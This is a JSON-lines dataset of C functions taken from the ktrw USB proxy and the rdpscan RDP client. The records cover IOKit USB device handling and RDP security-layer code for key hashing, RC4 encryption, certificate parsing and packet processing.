{"docstring": "// Close the device returned by ktrw_usb_open().\n", "func_signal": "static void\nktrw_usb_close(ktrw_usb_device ktrw)", "code": "{\n\tif (ktrw != KTRW_USB_NULL) {\n\t\tif (ktrw->interface != NULL) {\n\t\t\t(*ktrw->interface)->USBInterfaceClose(ktrw->interface);\n\t\t\t(*ktrw->interface)->Release(ktrw->interface);\n\t\t}\n\t\tif (ktrw->device != NULL) {\n\t\t\t(*ktrw->device)->USBDeviceClose(ktrw->device);\n\t\t\t(*ktrw->device)->Release(ktrw->device);\n\t\t}\n\t\tif (ktrw->service != IO_OBJECT_NULL) {\n\t\t\tIOObjectRelease(ktrw->service);\n\t\t}\n\t\tfree(ktrw);\n\t}\n}", "path": "ktrw/ktrw_usb_proxy/source/ktrw_usb_proxy.c", "commit_date": "2020-06-09 00:00:00", "repo_name": "googleprojectzero/ktrw", "stars": 632, "license": "apache-2.0", "language": "c", "size": 276}
{"docstring": "// Main function.\n", "func_signal": "int\nmain(int argc, const char *argv[])", "code": "{\n\t// Parse the arguments.\n\tif (argc != 2) {\n\t\tusage();\n\t}\n\tunsigned long port;\n\tbool ok = parse_int(argv[1], &port);\n\tif (!ok || port > 65535) {\n\t\tusage();\n\t}\n\t// Open the socket.\n\tint server_fd = -1;\n\tok = open_server_socket(port, &server_fd);\n\tif (!ok) {\n\t\treturn 1;\n\t}\n\tktrw_usb_proxy(server_fd);\n\tclose(server_fd);\n\treturn 0;\n}", "path": "ktrw/ktrw_usb_proxy/source/ktrw_usb_proxy.c", "commit_date": "2020-06-09 00:00:00", "repo_name": "googleprojectzero/ktrw", "stars": 632, "license": "apache-2.0", "language": "c", "size": 276}
{"docstring": "// Open the KTRW USB device.\n", "func_signal": "static ktrw_usb_device\nktrw_usb_open(io_service_t service, mach_port_t notification_port_set)", "code": "{\n\t// Create a Plug-In interface for the service.\n\tIOCFPlugInInterface **plugIn;\n\tSInt32 score;\n\tkern_return_t kr = IOCreatePlugInInterfaceForService(service, kIOUSBDeviceUserClientTypeID,\n\t\t\tkIOCFPlugInInterfaceID, &plugIn, &score);\n\tif (kr != KERN_SUCCESS) {\n\t\tprintf(\"Error: Could not create IOCFPlugInInterface for KTRW USB device\\n\");\n\t\tgoto fail_0;\n\t}\n\t// Create an IOUSBDeviceInterface for the USB device.\n\tIOUSBDeviceInterface182 **device = NULL;\n\t(*plugIn)->QueryInterface(plugIn, CFUUIDGetUUIDBytes(kIOUSBDeviceInterfaceID182),\n\t\t\t(LPVOID *)&device);\n\t(*plugIn)->Release(plugIn);\n\tif (device == NULL) {\n\t\tprintf(\"Error: Could not create IOUSBDeviceInterface for KTRW USB device\\n\");\n\t\tgoto fail_0;\n\t}\n\t// Open the IOUSBDeviceInterface. This allows us to call DeviceRequest() to perform control\n\t// transfers. This may take multiple tries.\n\tIOReturn result;\n\tfor (int try = 0;; try++) {\n\t\tresult = (*device)->USBDeviceOpen(device);\n\t\tif (result == kIOReturnSuccess) {\n\t\t\tbreak;\n\t\t}\n\t\tif (try >= KTRW_USB_OPEN_MAX_TRIES) {\n\t\t\tprintf(\"Error: Could not open IOUSBDeviceInterface for KTRW USB device: 0x%x: %s\\n\",\n\t\t\t\t\tresult, mach_error_string(result));\n\t\t\tgoto fail_1;\n\t\t}\n\t\tusleep(100000);\n\t}\n\t// Try to find the interface. This may take multiple tries.\n\tIOUSBFindInterfaceRequest interfaceMatch;\n\tinterfaceMatch.bInterfaceClass    = 0xfe;\n\tinterfaceMatch.bInterfaceSubClass = 0x13;\n\tinterfaceMatch.bInterfaceProtocol = 0x37;\n\tinterfaceMatch.bAlternateSetting  = 0;\n\tio_service_t interface_service;\n\tfor (int try = 0;; try++) {\n\t\t// Create an iterator over the interfaces.\n\t\tio_iterator_t interfaces;\n\t\tresult = (*device)->CreateInterfaceIterator(device, &interfaceMatch, &interfaces);\n\t\tif (result != kIOReturnSuccess) {\n\t\t\tprintf(\"Error: Could not create iterator over KTRW USB device's interfaces\\n\");\n\t\t\tgoto fail_2;\n\t\t}\n\t\t// Grab the first interface match.\n\t\tinterface_service = IOIteratorNext(interfaces);\n\t\tIOObjectRelease(interfaces);\n\t\tif (interface_service != IO_OBJECT_NULL) {\n\t\t\tbreak;\n\t\t}\n\t\tif (try >= KTRW_USB_OPEN_MAX_TRIES) {\n\t\t\tprintf(\"Error: No interfaces found for KTRW USB device\\n\");\n\t\t\tgoto fail_2;\n\t\t}\n\t\tusleep(100000);\n\t}\n\t// Create a Plug-In interface for the service.\n\tkr = IOCreatePlugInInterfaceForService(interface_service, kIOUSBInterfaceUserClientTypeID,\n\t\t\tkIOCFPlugInInterfaceID, &plugIn, &score);\n\tIOObjectRelease(interface_service);\n\tif (kr != KERN_SUCCESS) {\n\t\tprintf(\"Error: Could not create IOCFPlugInInterface for KTRW USB interface\\n\");\n\t\tgoto fail_2;\n\t}\n\t// Create an IOUSBDeviceInterface for the USB device.\n\tIOUSBInterfaceInterface182 **interface = NULL;\n\t(*plugIn)->QueryInterface(plugIn, CFUUIDGetUUIDBytes(kIOUSBInterfaceInterfaceID182),\n\t\t\t(LPVOID *)&interface);\n\t(*plugIn)->Release(plugIn);\n\tif (interface == NULL) {\n\t\tprintf(\"Error: Could not create IOUSBInterfaceInterface for KTRW USB interface\\n\");\n\t\tgoto fail_2;\n\t}\n\t// Open the interface.\n\tresult = (*interface)->USBInterfaceOpen(interface);\n\tif (result != kIOReturnSuccess) {\n\t\tprintf(\"Error: Could not open IOUSBInterfaceInterface for KTRW USB device\\n\");\n\t\tgoto fail_3;\n\t}\n\t// Check the number of endpoints.\n\tUInt8 numEndpoints;\n\tresult = (*interface)->GetNumEndpoints(interface, &numEndpoints);\n\tif (result != kIOReturnSuccess) {\n\t\tprintf(\"Error: Could not get the number of endpoints for the KTRW USB device interface\\n\");\n\t\tgoto fail_4;\n\t}\n\tif (numEndpoints != 2) {\n\t\tprintf(\"Warning: Unexpected number of endpoints for the KTRW USB device \"\n\t\t\t\t\"interface: %u\\n\", numEndpoints);\n\t}\n\t// Register a Mach port to receive asynchronous I/O completion notifications.\n\tmach_port_t io_port = MACH_PORT_NULL;\n\tkr = (*interface)->CreateInterfaceAsyncPort(interface, &io_port);\n\tif (kr != KERN_SUCCESS) {\n\t\tprintf(\"Error: Could not create KTRW USB asynchronous notification port\\n\");\n\t\tgoto fail_4;\n\t}\n\t// Add the async port to the notification port set.\n\tkr = mach_port_insert_member(mach_task_self(), io_port, notification_port_set);\n\tmach_port_deallocate(mach_task_self(), io_port);\n\tif (kr != KERN_SUCCESS) {\n\t\tprintf(\"Error: Could not add KTRW USB asynchronous notification port to port set\\n\");\n\t\tgoto fail_4;\n\t}\n\t// Create the ktrw_usb_device.\n\tktrw_usb_device ktrw = calloc(1, sizeof(*ktrw));\n\tassert(ktrw != NULL);\n\tktrw->service = service;\n\tktrw->device = device;\n\tktrw->interface = interface;\n\treturn ktrw;\nfail_4:\n\t(*interface)->USBInterfaceClose(interface);\nfail_3:\n\t(*interface)->Release(interface);\nfail_2:\n\t(*device)->USBDeviceClose(device);\nfail_1:\n\t(*device)->Release(device);\nfail_0:\n\treturn KTRW_USB_NULL;\n}", "path": "ktrw/ktrw_usb_proxy/source/ktrw_usb_proxy.c", "commit_date": "2020-06-09 00:00:00", "repo_name": "googleprojectzero/ktrw", "stars": 632, "license": "apache-2.0", "language": "c", "size": 276}
{"docstring": "/* Parse a public signature structure */\n", "func_signal": "static RD_BOOL\nsec_parse_public_sig(STREAM s, uint32 len, uint8 * modulus, uint8 * exponent)", "code": "{\n\tuint8 signature[SEC_MAX_MODULUS_SIZE];\n\tuint32 sig_len;\n\n\tif (len != 72)\n\t{\n\t\treturn True;\n\t}\n\tmemset(signature, 0, sizeof(signature));\n\tsig_len = len - 8;\n\tin_uint8a(s, signature, sig_len);\n\treturn rdssl_sig_ok(exponent, SEC_EXPONENT_SIZE, modulus, g_server_public_key_len,\n\t\t\t    signature, sig_len);\n}", "path": "rdpscan/src/secure.c", "commit_date": "2019-05-30 00:00:00", "repo_name": "robertdavidgraham/rdpscan", "stars": 883, "license": "None", "language": "c", "size": 312}
{"docstring": "/*\n * 16-byte sha1 hash\n */\n", "func_signal": "void\nsec_hash_sha1_16(uint8 * out, uint8 * in, uint8 * salt1)", "code": "{\n\tRDSSL_SHA1 sha1;\n\trdssl_sha1_init(&sha1);\n\trdssl_sha1_update(&sha1, in, 16);\n\trdssl_sha1_update(&sha1, salt1, 16);\n\trdssl_sha1_final(&sha1, out);\n}", "path": "rdpscan/src/secure.c", "commit_date": "2019-05-30 00:00:00", "repo_name": "robertdavidgraham/rdpscan", "stars": 883, "license": "None", "language": "c", "size": 312}
{"docstring": "/* Process crypto information blob */\n", "func_signal": "static void\nsec_process_crypt_info(STREAM s)", "code": "{\n\tuint8 *server_random = NULL;\n\tuint8 modulus[SEC_MAX_MODULUS_SIZE];\n\tuint8 exponent[SEC_EXPONENT_SIZE];\n\tuint32 rc4_key_size;\n\n\tmemset(modulus, 0, sizeof(modulus));\n\tmemset(exponent, 0, sizeof(exponent));\n\tif (!sec_parse_crypt_info(s, &rc4_key_size, &server_random, modulus, exponent))\n\t{\n\t\tDEBUG((\"Failed to parse crypt info\\n\"));\n\t\treturn;\n\t}\n\tDEBUG((\"Generating client random\\n\"));\n\tgenerate_random(g_client_random);\n\tsec_rsa_encrypt(g_sec_crypted_random, g_client_random, SEC_RANDOM_SIZE,\n\t\t\tg_server_public_key_len, modulus, exponent);\n\tsec_generate_keys(g_client_random, server_random, rc4_key_size);\n}", "path": "rdpscan/src/secure.c", "commit_date": "2019-05-30 00:00:00", "repo_name": "robertdavidgraham/rdpscan", "stars": 883, "license": "None", "language": "c", "size": 312}
{"docstring": "/* Reduce key entropy from 64 to 40 bits */\n", "func_signal": "static void\nsec_make_40bit(uint8 * key)", "code": "{\n\tkey[0] = 0xd1;\n\tkey[1] = 0x26;\n\tkey[2] = 0x9e;\n}", "path": "rdpscan/src/secure.c", "commit_date": "2019-05-30 00:00:00", "repo_name": "robertdavidgraham/rdpscan", "stars": 883, "license": "None", "language": "c", "size": 312}
{"docstring": "/* Output a uint32 into a buffer (little-endian) */\n", "func_signal": "void\nbuf_out_uint32(uint8 * buffer, uint32 value)", "code": "{\n\tbuffer[0] = (value) & 0xff;\n\tbuffer[1] = (value >> 8) & 0xff;\n\tbuffer[2] = (value >> 16) & 0xff;\n\tbuffer[3] = (value >> 24) & 0xff;\n}", "path": "rdpscan/src/secure.c", "commit_date": "2019-05-30 00:00:00", "repo_name": "robertdavidgraham/rdpscan", "stars": 883, "license": "None", "language": "c", "size": 312}
{"docstring": "/* Receive secure transport packet */\n", "func_signal": "STREAM\nsec_recv(uint8 * rdpver)", "code": "{\n\tuint32 sec_flags;\n\tuint16 channel;\n\tSTREAM s;\n\n\twhile ((s = mcs_recv(&channel, rdpver)) != NULL)\n\t{\n\t\tif (rdpver != NULL)\n\t\t{\n\t\t\tif (*rdpver != 3)\n\t\t\t{\n\t\t\t\tif (*rdpver & 0x80)\n\t\t\t\t{\n\t\t\t\t\tin_uint8s(s, 8);\t/* signature */\n\t\t\t\t\tsec_decrypt(s->p, (int)(s->end - s->p));\n\t\t\t\t}\n\t\t\t\treturn s;\n\t\t\t}\n\t\t}\n\t\tif (g_encryption || (!g_licence_issued && !g_licence_error_result))\n\t\t{\n\t\t\tin_uint32_le(s, sec_flags);\n\n\t\t\tif (g_encryption)\n\t\t\t{\n\t\t\t\tif (sec_flags & SEC_ENCRYPT)\n\t\t\t\t{\n\t\t\t\t\tin_uint8s(s, 8);\t/* signature */\n\t\t\t\t\tsec_decrypt(s->p, (int)(s->end - s->p));\n\t\t\t\t}\n\n\t\t\t\tif (sec_flags & SEC_LICENCE_NEG)\n\t\t\t\t{\n\t\t\t\t\tlicence_process(s);\n\t\t\t\t\tcontinue;\n\t\t\t\t}\n\n\t\t\t\tif (sec_flags & 0x0400)\t/* SEC_REDIRECT_ENCRYPT */\n\t\t\t\t{\n\t\t\t\t\tuint8 swapbyte;\n\n\t\t\t\t\tin_uint8s(s, 8);\t/* signature */\n\t\t\t\t\tsec_decrypt(s->p, (int)(s->end - s->p));\n\n\t\t\t\t\t/* Check for a redirect packet, starts with 00 04 */\n\t\t\t\t\tif (s->p[0] == 0 && s->p[1] == 4)\n\t\t\t\t\t{\n\t\t\t\t\t\t/* for some reason the PDU and the length seem to be swapped.\n\t\t\t\t\t\t   This isn't good, but we're going to do a byte for byte\n\t\t\t\t\t\t   swap.  So the first foure value appear as: 00 04 XX YY,\n\t\t\t\t\t\t   where XX YY is the little endian length. We're going to\n\t\t\t\t\t\t   use 04 00 as the PDU type, so after our swap this will look\n\t\t\t\t\t\t   like: XX YY 04 00 */\n\t\t\t\t\t\tswapbyte = s->p[0];\n\t\t\t\t\t\ts->p[0] = s->p[2];\n\t\t\t\t\t\ts->p[2] = swapbyte;\n\n\t\t\t\t\t\tswapbyte = s->p[1];\n\t\t\t\t\t\ts->p[1] = s->p[3];\n\t\t\t\t\t\ts->p[3] = swapbyte;\n\n\t\t\t\t\t\tswapbyte = s->p[2];\n\t\t\t\t\t\ts->p[2] = s->p[3];\n\t\t\t\t\t\ts->p[3] = swapbyte;\n\t\t\t\t\t}\n#ifdef WITH_DEBUG\n\t\t\t\t\t/* warning!  this debug statement will show passwords in the clear! */\n\t\t\t\t\thexdump(s->p, s->end - s->p);\n#endif\n\t\t\t\t}\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\tif ((sec_flags & 0xffff) == SEC_LICENCE_NEG)\n\t\t\t\t{\n\t\t\t\t\tlicence_process(s);\n\t\t\t\t\tcontinue;\n\t\t\t\t}\n\t\t\t\ts->p -= 4;\n\t\t\t}\n\t\t}\n\n\t\tif (channel != MCS_GLOBAL_CHANNEL)\n\t\t{\n\t\t\tchannel_process(s, channel);\n\t\t\tif (rdpver != NULL)\n\t\t\t\t*rdpver = 0xff;\n\t\t\treturn s;\n\t\t}\n\n\t\treturn s;\n\t}\n\n\treturn NULL;\n}", "path": "rdpscan/src/secure.c", "commit_date": "2019-05-30 00:00:00", "repo_name": "robertdavidgraham/rdpscan", "stars": 883, "license": "None", "language": "c", "size": 312}
{"docstring": "/* Parse a crypto information structure */\n", "func_signal": "static RD_BOOL\nsec_parse_crypt_info(STREAM s, uint32 * rc4_key_size,\n\t\t     uint8 ** server_random, uint8 * modulus, uint8 * exponent)", "code": "{\n\tuint32 crypt_level, random_len, rsa_info_len;\n\tuint32 cacert_len, cert_len, flags;\n\tRDSSL_CERT *cacert, *server_cert;\n\tRDSSL_RKEY *server_public_key;\n\tuint16 tag, length;\n\tuint8 *next_tag, *end;\n\n\tin_uint32_le(s, *rc4_key_size);\t/* 1 = 40-bit, 2 = 128-bit */\n\tin_uint32_le(s, crypt_level);\t/* 1 = low, 2 = medium, 3 = high */\n\tif (crypt_level == 0)\n\t{\n\t\t/* no encryption */\n\t\treturn False;\n\t}\n\n\tin_uint32_le(s, random_len);\n\tin_uint32_le(s, rsa_info_len);\n\n\tif (random_len != SEC_RANDOM_SIZE)\n\t{\n\t\terror(\"random len %d, expected %d\\n\", random_len, SEC_RANDOM_SIZE);\n\t\treturn False;\n\t}\n\n\tin_uint8p(s, *server_random, random_len);\n\n\t/* RSA info */\n\tend = s->p + rsa_info_len;\n\tif (end > s->end)\n\t\treturn False;\n\n\tin_uint32_le(s, flags);\t/* 1 = RDP4-style, 0x80000002 = X.509 */\n\tif (flags & 1)\n\t{\n        STATUS(3, \"RDP4 encryption w/ RSA and RC4\\n\");\n\t\tDEBUG_RDP5((\"We're going for the RDP4-style encryption\\n\"));\n\t\tin_uint8s(s, 8);\t/* unknown */\n\n\t\twhile (s->p < end)\n\t\t{\n\t\t\tin_uint16_le(s, tag);\n\t\t\tin_uint16_le(s, length);\n\n\t\t\tnext_tag = s->p + length;\n\n\t\t\tswitch (tag)\n\t\t\t{\n\t\t\t\tcase SEC_TAG_PUBKEY:\n\t\t\t\t\tif (!sec_parse_public_key(s, modulus, exponent))\n\t\t\t\t\t\treturn False;\n\t\t\t\t\tDEBUG_RDP5((\"Got Public key, RDP4-style\\n\"));\n\n\t\t\t\t\tbreak;\n\n\t\t\t\tcase SEC_TAG_KEYSIG:\n\t\t\t\t\tif (!sec_parse_public_sig(s, length, modulus, exponent))\n\t\t\t\t\t\treturn False;\n\t\t\t\t\tbreak;\n\n\t\t\t\tdefault:\n\t\t\t\t\tunimpl(\"crypt tag 0x%x\\n\", tag);\n\t\t\t}\n\n\t\t\ts->p = next_tag;\n\t\t}\n\t}\n\telse\n\t{\n\t\tuint32 certcount;\n        STATUS(3, \"RDP5 encryption w/ certificate\\n\");\n\t\tDEBUG_RDP5((\"We're going for the RDP5-style encryption\\n\"));\n\t\tin_uint32_le(s, certcount);\t/* Number of certificates */\n\t\tif (certcount < 2)\n\t\t{\n\t\t\terror(\"Server didn't send enough X509 certificates\\n\");\n\t\t\treturn False;\n\t\t}\n\t\tfor (; certcount > 2; certcount--)\n\t\t{\t\t/* ignore all the certificates between the root and the signing CA */\n\t\t\tuint32 ignorelen;\n\t\t\tRDSSL_CERT *ignorecert;\n\n\t\t\tDEBUG_RDP5((\"Ignored certs left: %d\\n\", certcount));\n\t\t\tin_uint32_le(s, ignorelen);\n\t\t\tDEBUG_RDP5((\"Ignored Certificate length is %d\\n\", ignorelen));\n\t\t\tignorecert = rdssl_cert_read(s->p, ignorelen);\n\t\t\tin_uint8s(s, ignorelen);\n\t\t\tif (ignorecert == NULL)\n\t\t\t{\t/* XXX: error out? */\n\t\t\t\tDEBUG_RDP5((\"got a bad cert: this will probably screw up the rest of the communication\\n\"));\n\t\t\t}\n\n#ifdef WITH_DEBUG_RDP5\n\t\t\tDEBUG_RDP5((\"cert #%d (ignored):\\n\", certcount));\n\t\t\trdssl_cert_print_fp(stdout, ignorecert);\n#endif\n\t\t}\n\t\t/* Do da funky X.509 stuffy\n\n\t\t   \"How did I find out about this?  I looked up and saw a\n\t\t   bright light and when I came to I had a scar on my forehead\n\t\t   and knew about X.500\"\n\t\t   - Peter Gutman in a early version of \n\t\t   http://www.cs.auckland.ac.nz/~pgut001/pubs/x509guide.txt\n\t\t */\n\t\tin_uint32_le(s, cacert_len);\n\t\tDEBUG_RDP5((\"CA Certificate length is %d\\n\", cacert_len));\n\t\tcacert = rdssl_cert_read(s->p, cacert_len);\n\t\tin_uint8s(s, cacert_len);\n\t\tif (NULL == cacert)\n\t\t{\n\t\t\terror(\"Couldn't load CA Certificate from server\\n\");\n\t\t\treturn False;\n\t\t}\n\t\tin_uint32_le(s, cert_len);\n\t\tDEBUG_RDP5((\"Certificate length is %d\\n\", cert_len));\n\t\tserver_cert = rdssl_cert_read(s->p, cert_len);\n\t\tin_uint8s(s, cert_len);\n\t\tif (NULL == server_cert)\n\t\t{\n\t\t\trdssl_cert_free(cacert);\n\t\t\terror(\"Couldn't load Certificate from server\\n\");\n\t\t\treturn False;\n\t\t}\n\t\tif (!rdssl_certs_ok(server_cert, cacert))\n\t\t{\n\t\t\trdssl_cert_free(server_cert);\n\t\t\trdssl_cert_free(cacert);\n\t\t\terror(\"Security error CA Certificate invalid\\n\");\n\t\t\treturn False;\n\t\t}\n\t\trdssl_cert_free(cacert);\n\t\tin_uint8s(s, 16);\t/* Padding */\n\t\tserver_public_key = rdssl_cert_to_rkey(server_cert, &g_server_public_key_len);\n\t\tif (NULL == server_public_key)\n\t\t{\n\t\t\tDEBUG_RDP5((\"Didn't parse X509 correctly\\n\"));\n\t\t\trdssl_cert_free(server_cert);\n\t\t\treturn False;\n\t\t}\n\t\trdssl_cert_free(server_cert);\n\t\tif ((g_server_public_key_len < SEC_MODULUS_SIZE) ||\n\t\t    (g_server_public_key_len > SEC_MAX_MODULUS_SIZE))\n\t\t{\n\t\t\terror(\"Bad server public key size (%u bits)\\n\",\n\t\t\t      g_server_public_key_len * 8);\n\t\t\trdssl_rkey_free(server_public_key);\n\t\t\treturn False;\n\t\t}\n\t\tif (rdssl_rkey_get_exp_mod(server_public_key, exponent, SEC_EXPONENT_SIZE,\n\t\t\t\t\t   modulus, SEC_MAX_MODULUS_SIZE) != 0)\n\t\t{\n\t\t\terror(\"Problem extracting RSA exponent, modulus\");\n\t\t\trdssl_rkey_free(server_public_key);\n\t\t\treturn False;\n\t\t}\n\t\trdssl_rkey_free(server_public_key);\n\t\treturn True;\t/* There's some garbage here we don't care about */\n\t}\n\treturn s_check_end(s);\n}", "path": "rdpscan/src/secure.c", "commit_date": "2019-05-30 00:00:00", "repo_name": "robertdavidgraham/rdpscan", "stars": 883, "license": "None", "language": "c", "size": 312}
{"docstring": "/* Output connect initial data blob */\n", "func_signal": "static void\nsec_out_mcs_data(STREAM s, uint32 selected_protocol)", "code": "{\n\tint hostlen = 2 * (int)strlen(g_hostname);\n\tint length = 162 + 76 + 12 + 4;\n\tunsigned int i;\n    uint32 cluster_flags;\n\n\tif (g_num_channels > 0)\n\t\tlength += g_num_channels * 12 + 8;\n\n\tif (hostlen > 30)\n\t\thostlen = 30;\n\n\t/* Generic Conference Control (T.124) ConferenceCreateRequest */\n\tout_uint16_be(s, 5);\n\tout_uint16_be(s, 0x14);\n\tout_uint8(s, 0x7c);\n\tout_uint16_be(s, 1);\n\n\tout_uint16_be(s, (length | 0x8000));\t/* remaining length */\n\n\tout_uint16_be(s, 8);\t/* length? */\n\tout_uint16_be(s, 16);\n\tout_uint8(s, 0);\n\tout_uint16_le(s, 0xc001);\n\tout_uint8(s, 0);\n\n\tout_uint32_le(s, 0x61637544);\t/* OEM ID: \"Duca\", as in Ducati. */\n\tout_uint16_be(s, ((length - 14) | 0x8000));\t/* remaining length */\n\n\t/* Client information */\n\tout_uint16_le(s, SEC_TAG_CLI_INFO);\n\tout_uint16_le(s, 216);\t/* length */\n\tout_uint16_le(s, (g_rdp_version >= RDP_V5) ? 4 : 1);\t/* RDP version. 1 == RDP4, 4 >= RDP5 to RDP8 */\n\tout_uint16_le(s, 8);\n\tout_uint16_le(s, g_width);\n\tout_uint16_le(s, g_height);\n\tout_uint16_le(s, 0xca01);\n\tout_uint16_le(s, 0xaa03);\n\tout_uint32_le(s, g_keylayout);\n\tout_uint32_le(s, 2600);\t/* Client build. We are now 2600 compatible :-) */\n\n\t/* Unicode name of client, padded to 32 bytes */\n\trdp_out_unistr(s, g_hostname, hostlen);\n\tout_uint8s(s, 30 - hostlen);\n\n\t/* See\n\t   http://msdn.microsoft.com/library/default.asp?url=/library/en-us/wceddk40/html/cxtsksupportingremotedesktopprotocol.asp */\n\tout_uint32_le(s, g_keyboard_type);\n\tout_uint32_le(s, g_keyboard_subtype);\n\tout_uint32_le(s, g_keyboard_functionkeys);\n\tout_uint8s(s, 64);\t/* reserved? 4 + 12 doublewords */\n\tout_uint16_le(s, 0xca01);\t/* colour depth? */\n\tout_uint16_le(s, 1);\n\n\tout_uint32(s, 0);\n\tout_uint8(s, g_server_depth);\n\tout_uint16_le(s, 0x0700);\n\tout_uint8(s, 0);\n\tout_uint32_le(s, 1);\n\tout_uint8s(s, 64);\n\tout_uint32_le(s, selected_protocol);\t/* End of client info */\n\n\t/* Write a Client Cluster Data (TS_UD_CS_CLUSTER) */\n\tcluster_flags = 0;\n\tout_uint16_le(s, SEC_TAG_CLI_CLUSTER);\t/* header.type */\n\tout_uint16_le(s, 12);\t/* length */\n\n\tcluster_flags |= SEC_CC_REDIRECTION_SUPPORTED;\n\tcluster_flags |= (SEC_CC_REDIRECT_VERSION_3 << 2);\n\n\tif (g_console_session || g_redirect_session_id != 0)\n\t\tcluster_flags |= SEC_CC_REDIRECT_SESSIONID_FIELD_VALID;\n\n\tout_uint32_le(s, cluster_flags);\n\tout_uint32(s, g_redirect_session_id);\n\n\t/* Client encryption settings */\n\tout_uint16_le(s, SEC_TAG_CLI_CRYPT);\n\tout_uint16_le(s, 12);\t/* length */\n\tout_uint32_le(s, g_encryption ? 0x3 : 0);\t/* encryption supported, 128-bit supported */\n\tout_uint32(s, 0);\t/* Unknown */\n\n\tDEBUG_RDP5((\"g_num_channels is %d\\n\", g_num_channels));\n\tif (g_num_channels > 0)\n\t{\n\t\tout_uint16_le(s, SEC_TAG_CLI_CHANNELS);\n\t\tout_uint16_le(s, g_num_channels * 12 + 8);\t/* length */\n\t\tout_uint32_le(s, g_num_channels);\t/* number of virtual channels */\n\t\tfor (i = 0; i < g_num_channels; i++)\n\t\t{\n\t\t\tDEBUG_RDP5((\"Requesting channel %s\\n\", g_channels[i].name));\n\t\t\tout_uint8a(s, g_channels[i].name, 8);\n\t\t\tout_uint32_be(s, g_channels[i].flags);\n\t\t}\n\t}\n\n\ts_mark_end(s);\n}", "path": "rdpscan/src/secure.c", "commit_date": "2019-05-30 00:00:00", "repo_name": "robertdavidgraham/rdpscan", "stars": 883, "license": "None", "language": "c", "size": 312}
{"docstring": "/* Transfer the client random to the server */\n", "func_signal": "static void\nsec_establish_key(void)", "code": "{\n\tuint32 length = g_server_public_key_len + SEC_PADDING_SIZE;\n\tuint32 flags = SEC_CLIENT_RANDOM;\n\tSTREAM s;\n\n\ts = sec_init(flags, length + 4);\n\n\tout_uint32_le(s, length);\n\tout_uint8p(s, g_sec_crypted_random, g_server_public_key_len);\n\tout_uint8s(s, SEC_PADDING_SIZE);\n\n\ts_mark_end(s);\n\tsec_send(s, flags);\n}", "path": "rdpscan/src/secure.c", "commit_date": "2019-05-30 00:00:00", "repo_name": "robertdavidgraham/rdpscan", "stars": 883, "license": "None", "language": "c", "size": 312}
{"docstring": "/* Decrypt data using RC4 */\n", "func_signal": "void\nsec_decrypt(uint8 * data, int length)", "code": "{\n\tif (g_sec_decrypt_use_count == 4096)\n\t{\n\t\tsec_update(g_sec_decrypt_key, g_sec_decrypt_update_key);\n\t\trdssl_rc4_set_key(&g_rc4_decrypt_key, g_sec_decrypt_key, g_rc4_key_len);\n\t\tg_sec_decrypt_use_count = 0;\n\t}\n\n\trdssl_rc4_crypt(&g_rc4_decrypt_key, data, data, length);\n\tg_sec_decrypt_use_count++;\n}", "path": "rdpscan/src/secure.c", "commit_date": "2019-05-30 00:00:00", "repo_name": "robertdavidgraham/rdpscan", "stars": 883, "license": "None", "language": "c", "size": 312}
{"docstring": "/* Initialise secure transport packet */\n", "func_signal": "STREAM\nsec_init(uint32 flags, int maxlen)", "code": "{\n\tint hdrlen;\n\tSTREAM s;\n\n\tif (!g_licence_issued && !g_licence_error_result)\n\t\thdrlen = (flags & SEC_ENCRYPT) ? 12 : 4;\n\telse\n\t\thdrlen = (flags & SEC_ENCRYPT) ? 12 : 0;\n\ts = mcs_init(maxlen + hdrlen);\n\ts_push_layer(s, sec_hdr, hdrlen);\n\n\treturn s;\n}", "path": "rdpscan/src/secure.c", "commit_date": "2019-05-30 00:00:00", "repo_name": "robertdavidgraham/rdpscan", "stars": 883, "license": "None", "language": "c", "size": 312}
{"docstring": "/* Process SRV_INFO, find RDP version supported by server */\n", "func_signal": "static void\nsec_process_srv_info(STREAM s)", "code": "{\n    extern char g_targetaddr[];\n    extern char g_targetport[];\n    uint16 minor;\n\tin_uint16_le(s, g_server_rdp_version);\n\tin_uint16_le(s, minor);\n    STATUS(1, \"[+] version = v%u.%u\\n\", g_server_rdp_version, minor);\n\tDEBUG_RDP5((\"Server RDP version is %d\\n\", g_server_rdp_version));\n\tif (1 == g_server_rdp_version)\n\t{\n\t\tg_rdp_version = RDP_V4;\n\t\tg_server_depth = 8;\n\t}\n}", "path": "rdpscan/src/secure.c", "commit_date": "2019-05-30 00:00:00", "repo_name": "robertdavidgraham/rdpscan", "stars": 883, "license": "None", "language": "c", "size": 312}
{"docstring": "/* Encrypt data using RC4 */\n", "func_signal": "static void\nsec_encrypt(uint8 * data, int length)", "code": "{\n\tif (g_sec_encrypt_use_count == 4096)\n\t{\n\t\tsec_update(g_sec_encrypt_key, g_sec_encrypt_update_key);\n\t\trdssl_rc4_set_key(&g_rc4_encrypt_key, g_sec_encrypt_key, g_rc4_key_len);\n\t\tg_sec_encrypt_use_count = 0;\n\t}\n\n\trdssl_rc4_crypt(&g_rc4_encrypt_key, data, data, length);\n\tg_sec_encrypt_use_count++;\n}", "path": "rdpscan/src/secure.c", "commit_date": "2019-05-30 00:00:00", "repo_name": "robertdavidgraham/rdpscan", "stars": 883, "license": "None", "language": "c", "size": 312}
{"docstring": "/*\n * 48-byte transformation used to generate master secret (6.1) and key material (6.2.2).\n * Both SHA1 and MD5 algorithms are used.\n */\n", "func_signal": "void\nsec_hash_48(uint8 * out, uint8 * in, uint8 * salt1, uint8 * salt2, uint8 salt)", "code": "{\n\tuint8 shasig[20];\n\tuint8 pad[4];\n\tRDSSL_SHA1 sha1;\n\tRDSSL_MD5 md5;\n\tint i;\n\n\tfor (i = 0; i < 3; i++)\n\t{\n\t\tmemset(pad, salt + i, i + 1);\n\n\t\trdssl_sha1_init(&sha1);\n\t\trdssl_sha1_update(&sha1, pad, i + 1);\n\t\trdssl_sha1_update(&sha1, in, 48);\n\t\trdssl_sha1_update(&sha1, salt1, 32);\n\t\trdssl_sha1_update(&sha1, salt2, 32);\n\t\trdssl_sha1_final(&sha1, shasig);\n\n\t\trdssl_md5_init(&md5);\n\t\trdssl_md5_update(&md5, in, 48);\n\t\trdssl_md5_update(&md5, shasig, 20);\n\t\trdssl_md5_final(&md5, &out[i * 16]);\n\t}\n}", "path": "rdpscan/src/secure.c", "commit_date": "2019-05-30 00:00:00", "repo_name": "robertdavidgraham/rdpscan", "stars": 883, "license": "None", "language": "c", "size": 312}
